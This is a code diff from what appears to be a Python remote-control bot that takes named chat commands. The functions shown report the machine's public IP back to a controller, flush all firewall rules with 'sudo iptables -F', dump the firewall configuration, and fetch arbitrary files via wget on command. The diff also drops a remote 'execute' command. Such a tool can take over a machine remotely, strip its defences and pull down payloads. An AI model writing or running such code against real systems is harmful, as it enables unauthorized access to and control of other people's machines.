@@ -103,28 +103,31 @@ def getIP(): #gets the public IP address
 	sendData(my_ip)
 
 def flushFirewall(): #flushes the firewall rules
-	os = platform.system().lower()
 	if (os == "linux"):
-		request = execute("sudo iptables -F")#flushing rules
+		request = execute("sudo iptables -F") #flushing rules
 		sendData("Firewall rules have been flushed.")
 
 def checkFirewall(): #reports current firewall config
-	os = platform.system().lower()
 	if (os == "linux"):
 		sendData("Current Firewall Rules:")
 		request = execute("sudo iptables -L -n")
 		sendData(request)
+	elif (os == "windows"):
+		sendData("idk how to windows yet boss.")
+	elif (os == "macintosh"):
+		sendData("idk how to mac yet boss.")
+	else:
+		sendData("unknown")
 
 def download(cmd): #file downloader
-	os = platform.system().lower()
 	if (os == "linux"):
-		if (cmd.count(" ") != 1):#make sure there is only 1 space
+		if (cmd.count(" ") != 1): #make sure there is only 1 space
 			sendData("Usage: download [file] [dir]")
 		else:
 			args = cmd.split(" ")
 			download = "wget -q -P " + args[1] + " " + args[0]
 			
-			request = execute(download)#executing the download
+			request = execute(download) #executing the download
 			sendData("Download executed.")
 
 
@@ -154,7 +157,6 @@ commands = {
 	"who are you" : whoAmI,
 	"how old are you" : getAge,
 	"zombie apocalypse" : terminate,
-	"execute" : runAndSend,
 	"free" : freeSpace,
 	"uptime" : uptime,
 	"version" : version,
